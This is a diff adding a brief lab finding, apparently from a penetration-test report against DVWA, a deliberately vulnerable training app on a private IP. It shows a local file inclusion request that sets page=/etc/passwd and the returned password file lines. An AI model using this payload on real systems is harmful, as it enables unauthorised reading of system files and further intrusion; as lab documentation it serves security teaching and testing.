@@ -1,0 +1,10 @@
+FINDING 2: Local File Inclusion (DVWA)
+Request:
+GET /dvwa/vulnerabilities/fi/?page=/etc/passwd HTTP/1.1
+Host: 192.168.56.107
+
+Response:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+...
